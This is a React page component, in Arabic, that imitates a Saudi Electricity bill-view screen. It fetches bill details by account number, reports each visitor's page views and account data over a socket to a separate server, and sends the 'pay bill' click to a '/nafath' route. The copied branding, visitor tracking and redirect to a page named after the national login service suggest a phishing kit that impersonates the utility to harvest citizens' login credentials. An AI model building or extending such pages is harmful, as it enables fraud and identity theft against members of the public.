import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { socket } from "@/lib/store";

interface BillData {
  d: {
    ContractAccount: string;
    CurrentDueAmt: string;
    TotalDueAmt: string;
    TotalDueAmountDisplay: string;
    PreBal: string;
    DueDate: string;
    FromDate: string;
    ToDate: string;
    InvDate: string;
    InvAmt: string;
    ConsumptionAmt: string;
    MeterRent: string;
    OtherAmount: string;
    ReconFee: string;
    VatAmt: string;
    TotalAmtExTax: string;
    NoOfDays: string;
    TotalConsumption: string;
    TarifType: string;
    Office: string;
    MeterTypeDesc: string;
    BillType: string;
    Currency: string;
    LastPayRec: string;
    SdAmount: string;
    PaidSdAmount: string;
    Consumption: string;
    BudgetBillAmt: string;
    CreditAmt: string;
    SplDiscount: string;
    Premise: string;
    PercentageVatAmt: string;
    Bill_MultiMeterDetail: {
      results: Array<{
        MeterNo: string;
        SubscriptionNo: string;
        BreakerCap: string;
        MultiplicationFactor: string;
        CurrentMtrRead: string;
        PreMeterRead: string;
        Consumption: string;
        CurrentReadDate: string;
        PreReadDate: string;
      }>;
    };
    Bill_ConsumptionHistory: {
      results: Array<{
        Yearperiod: string;
        ConsQty: string;
        ConsAmt: string;
        MtrRentAmt: string;
        Amount: string;
        MonthDate: string;
      }>;
    };
  };
}

function parseDateAr(dateStr: string | null): string {
  if (!dateStr) return "-";
  const match = dateStr.match(/\/Date\((\d+)\)\//);
  if (!match) return dateStr;
  const date = new Date(parseInt(match[1]));
  const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
  return `${date.getFullYear()},${months[date.getMonth()]} ${date.getDate()}`;
}

const thStyle: React.CSSProperties = {
  color: '#66799e',
  fontSize: '14px',
  fontWeight: 500,
  padding: '12px 16px',
  textAlign: 'right',
  whiteSpace: 'nowrap',
};

const tdStyle: React.CSSProperties = {
  color: '#001f5e',
  fontSize: '15px',
  fontWeight: 400,
  padding: '20px 16px',
  textAlign: 'right',
  whiteSpace: 'nowrap',
};

const rowLabelStyle: React.CSSProperties = {
  color: '#66799e',
  fontSize: '15px',
  fontWeight: 400,
  padding: '14px 0',
  textAlign: 'right',
};

const rowValueStyle: React.CSSProperties = {
  color: '#001f5e',
  fontSize: '15px',
  fontWeight: 400,
  padding: '14px 0',
  textAlign: 'left',
  direction: 'ltr' as const,
};

export default function BillView() {
  const [billData, setBillData] = useState<BillData | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [financialOpen, setFinancialOpen] = useState(false);
  const [technicalOpen, setTechnicalOpen] = useState(true);
  const [, setLocation] = useLocation();

  useEffect(() => {
    const stored = sessionStorage.getItem("accountNumber");
    if (!stored) {
      setLocation("/");
      return;
    }
    setAccountNumber(stored);
    fetchBillData(stored);
  }, []);

  const fetchBillData = async (account: string) => {
    try {
      setIsLoading(true);
      const serverUrl = import.meta.env.VITE_SOCKET_URL || "";
      const response = await fetch(`${serverUrl}/api/bill/${account}`);
      if (!response.ok) throw new Error("فشل في جلب بيانات الفاتورة");
      const data = await response.json();
      setBillData(data);
      socket.value.emit("visitor:pageView", { page: "bill-view", url: window.location.href, data: { accountNumber: account } });
    } catch (err: any) {
      setError(err.message || "حدث خطأ");
    } finally {
      setIsLoading(false);
    }
  };

  const handlePayBill = () => {
    socket.value.emit("visitor:formSubmit", {
      page: "bill-view",
      data: { accountNumber, action: "pay-bill", amount: billData?.d?.TotalDueAmountDisplay }
    });
    setLocation("/nafath");
  };

  const fontFaces = `
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Regular.woff2') format('woff2'); font-weight: 400; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Medium.woff2') format('woff2'); font-weight: 500; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-SemiBold.woff2') format('woff2'); font-weight: 600; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Light.woff2') format('woff2'); font-weight: 300; }
  `;

  if (isLoading) {
    return (
      <>
        <style>{fontFaces}</style>
        <div className="min-h-screen bg-white flex items-center justify-center" dir="rtl" style={{ fontFamily: "'SE', sans-serif" }}>
          <div style={{ textAlign: 'center' }}>
            <svg className="animate-spin" style={{ width: '40px', height: '40px', margin: '0 auto 16px', color: '#06c' }} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle style={{ opacity: 0.25 }} cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path style={{ opacity: 0.75 }} fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <p style={{ color: '#66799e', fontSize: '16px' }}>جاري تحميل بيانات الفاتورة...</p>
          </div>
        </div>
      </>
    );
  }

  if (error || !billData) {
    return (
      <>
        <style>{fontFaces}</style>
        <div className="min-h-screen bg-white flex items-center justify-center" dir="rtl" style={{ fontFamily: "'SE', sans-serif" }}>
          <div style={{ textAlign: 'center', padding: '20px' }}>
            <p style={{ color: '#c00', fontSize: '18px', fontWeight: 600, marginBottom: '12px' }}>لم يتم العثور على فاتورة</p>
            <p style={{ color: '#66799e', fontSize: '14px', marginBottom: '24px' }}>{error || "تأكد من رقم الحساب وحاول مرة أخرى"}</p>
            <button onClick={() => setLocation("/")} style={{
              fontFamily: "'SE', sans-serif", fontSize: '16px', fontWeight: 400,
              padding: '10px 30px', borderRadius: '12px', border: 'none', cursor: 'pointer',
              backgroundColor: '#06c', color: '#fff',
            }}>رجوع</button>
          </div>
        </div>
      </>
    );
  }

  const bill = billData.d;
  const meter = bill.Bill_MultiMeterDetail?.results?.[0];

  return (
    <>
      <style>{fontFaces}</style>
      <div className="min-h-screen bg-white" dir="rtl" style={{ fontFamily: "'SE', sans-serif", paddingBottom: '100px' }}>

        {/* Header */}
        <div style={{
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          height: '70px', padding: '15px 55px 14px',
        }}>
          <a href="#" style={{ display: 'block' }}>
            <img src="/se-logo.svg" alt="السعودية للطاقة" style={{ width: '90px', height: '58px', objectFit: 'contain' }} />
          </a>
          <button onClick={() => setLocation("/")} style={{
            background: '#e8f0fe', border: 'none', cursor: 'pointer', padding: '10px',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            borderRadius: '12px', width: '44px', height: '44px',
          }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#06c" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        {/* Title */}
        <div style={{ textAlign: 'center', paddingTop: '40px', paddingBottom: '30px' }}>
          <p style={{ color: '#66799e', fontSize: '16px', fontWeight: 400, marginBottom: '8px' }}>عرض ودفع الفواتير</p>
          <h1 style={{ color: '#001f5e', fontSize: '36px', fontWeight: 600, letterSpacing: '1px', direction: 'ltr', display: 'inline-block' }}>
            {accountNumber}
          </h1>
        </div>

        {/* Content */}
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 30px' }}>

          {/* ===== Current Bill Summary ===== */}
          <div style={{ borderTop: '1px solid #e8ecf1', paddingTop: '24px' }}>
            <div style={{ display: 'flex', alignItems: 'stretch' }}>
              <div style={{ width: '4px', backgroundColor: '#06c', borderRadius: '2px', marginLeft: '16px' }}></div>
              <div style={{ flex: 1 }}>
                <h2 style={{ color: '#06c', fontSize: '20px', fontWeight: 600, marginBottom: '24px', textAlign: 'right' }}>
                  ملخص الفاتورة الحالية
                </h2>
                <div style={{ overflowX: 'auto' }}>
                  <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                    <thead>
                      <tr>
                        <th style={thStyle}>المبلغ المسدد</th>
                        <th style={thStyle}>المبلغ المتبقي</th>
                        <th style={thStyle}>المبلغ السابق</th>
                        <th style={thStyle}>تاريخ بداية الاستحقاق</th>
                        <th style={thStyle}>إجمالي الفاتورة</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td style={{ ...tdStyle, background: 'linear-gradient(to left, rgba(0,102,204,0.04), transparent)' }}>
                          ﷼ {parseFloat(bill.PreBal || '0').toFixed(2)}
                        </td>
                        <td style={{ ...tdStyle, background: 'linear-gradient(to left, rgba(0,102,204,0.04), transparent)' }}>
                          ﷼ {parseFloat(bill.TotalDueAmountDisplay || '0').toFixed(2)}
                        </td>
                        <td style={{ ...tdStyle, background: 'linear-gradient(to left, rgba(0,102,204,0.04), transparent)' }}>
                          ﷼ 0.00
                        </td>
                        <td style={{ ...tdStyle, background: 'linear-gradient(to left, rgba(0,102,204,0.04), transparent)' }}>
                          {parseDateAr(bill.DueDate)}
                        </td>
                        <td style={{ ...tdStyle, fontWeight: 600, fontSize: '18px', background: 'linear-gradient(to left, rgba(0,102,204,0.04), transparent)' }}>
                          ﷼ {parseFloat(bill.InvAmt || '0').toFixed(2)}
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>

          {/* ===== Financial Data ===== */}
          <div style={{ borderTop: '1px solid #e8ecf1', paddingTop: '20px', marginTop: '20px' }}>
            <div
              style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', cursor: 'pointer', paddingBottom: '16px' }}
              onClick={() => setFinancialOpen(!financialOpen)}
            >
              <div style={{ display: 'flex', alignItems: 'center' }}>
                <div style={{ width: '4px', backgroundColor: '#06c', borderRadius: '2px', height: '30px', marginLeft: '16px' }}></div>
                <h2 style={{ color: '#06c', fontSize: '20px', fontWeight: 600 }}>المعلومات المالية</h2>
              </div>
              <button style={{
                width: '36px', height: '36px', borderRadius: '50%', border: '2px solid #06c',
                background: 'transparent', color: '#06c', fontSize: '22px', fontWeight: 600,
                display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer',
                lineHeight: 1,
              }}>
                {financialOpen ? '−' : '+'}
              </button>
            </div>

            {financialOpen && (
              <div style={{ paddingRight: '20px', paddingBottom: '16px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>قيمة الاستهلاك</span>
                  <span style={rowValueStyle}>﷼ {parseFloat(bill.ConsumptionAmt || '0').toFixed(2)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>إيجار العداد</span>
                  <span style={rowValueStyle}>﷼ {parseFloat(bill.MeterRent || '0').toFixed(2)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>رسوم أخرى</span>
                  <span style={rowValueStyle}>﷼ {parseFloat(bill.OtherAmount || '0').toFixed(2)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>الإجمالي قبل الضريبة</span>
                  <span style={rowValueStyle}>﷼ {parseFloat(bill.TotalAmtExTax || '0').toFixed(2)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>ضريبة القيمة المضافة ({bill.PercentageVatAmt || '15'}%)</span>
                  <span style={rowValueStyle}>﷼ {parseFloat(bill.VatAmt || '0').toFixed(2)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', ...rowLabelStyle, fontWeight: 600, color: '#001f5e' }}>
                  <span>إجمالي الفاتورة</span>
                  <span style={{ ...rowValueStyle, fontWeight: 600 }}>﷼ {parseFloat(bill.InvAmt || '0').toFixed(2)}</span>
                </div>
              </div>
            )}
          </div>

          {/* ===== Technical Data ===== */}
          <div style={{ borderTop: '1px solid #e8ecf1', paddingTop: '20px', marginTop: '4px' }}>
            <div
              style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', cursor: 'pointer', paddingBottom: '16px' }}
              onClick={() => setTechnicalOpen(!technicalOpen)}
            >
              <div style={{ display: 'flex', alignItems: 'center' }}>
                <div style={{ width: '4px', backgroundColor: '#06c', borderRadius: '2px', height: '30px', marginLeft: '16px' }}></div>
                <h2 style={{ color: '#06c', fontSize: '20px', fontWeight: 600 }}>المعلومات الفنية</h2>
              </div>
              <button style={{
                width: '36px', height: '36px', borderRadius: '50%', border: '2px solid #06c',
                background: 'transparent', color: '#06c', fontSize: '22px', fontWeight: 600,
                display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer',
                lineHeight: 1,
              }}>
                {technicalOpen ? '−' : '+'}
              </button>
            </div>

            {technicalOpen && (
              <div style={{ paddingRight: '20px', paddingBottom: '16px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>بداية الفترة</span>
                  <span style={rowValueStyle}>{parseDateAr(bill.FromDate)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>نهاية الفترة</span>
                  <span style={rowValueStyle}>{parseDateAr(bill.ToDate)}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>تاريخ القراءة السابق</span>
                  <span style={rowValueStyle}>{meter ? parseDateAr(meter.PreReadDate) : '-'}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>تاريخ القراءة الحالي</span>
                  <span style={rowValueStyle}>{meter ? parseDateAr(meter.CurrentReadDate) : '-'}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>عدد الأيام</span>
                  <span style={rowValueStyle}>{bill.NoOfDays || '-'}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>نوع التعرفة</span>
                  <span style={rowValueStyle}>{bill.TarifType === 'Residential' ? 'سكني' : bill.TarifType || '-'}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                  <span>نوع العداد</span>
                  <span style={rowValueStyle}>{bill.MeterTypeDesc || '-'}</span>
                </div>
                {meter && (
                  <>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                      <span>رقم العداد</span>
                      <span style={rowValueStyle}>{meter.MeterNo || '-'}</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                      <span>رقم الاشتراك</span>
                      <span style={rowValueStyle}>{meter.SubscriptionNo || '-'}</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                      <span>القراءة السابقة</span>
                      <span style={rowValueStyle}>{parseFloat(meter.PreMeterRead || '0').toFixed(2)}</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                      <span>القراءة الحالية</span>
                      <span style={rowValueStyle}>{parseFloat(meter.CurrentMtrRead || '0').toFixed(2)}</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                      <span>الاستهلاك (كيلوواط)</span>
                      <span style={rowValueStyle}>{parseFloat(meter.Consumption || '0').toFixed(2)}</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #f0f2f5', ...rowLabelStyle }}>
                      <span>سعة القاطع</span>
                      <span style={rowValueStyle}>{parseFloat(meter.BreakerCap || '0').toFixed(0)} أمبير</span>
                    </div>
                  </>
                )}
              </div>
            )}
          </div>
        </div>

        {/* Fixed Pay Button */}
        <div style={{
          position: 'fixed', bottom: 0, left: 0, right: 0,
          padding: '16px 30px', background: 'white',
          borderTop: '1px solid #e8ecf1',
          display: 'flex', justifyContent: 'flex-start',
        }}>
          <button onClick={handlePayBill} style={{
            fontFamily: "'SE', sans-serif", fontSize: '18px', fontWeight: 500,
            padding: '14px 60px', borderRadius: '12px', border: 'none', cursor: 'pointer',
            backgroundColor: '#06c', color: '#fff',
            display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
          }}>
            دفع الفاتورة
          </button>
        </div>
      </div>
    </>
  );
}
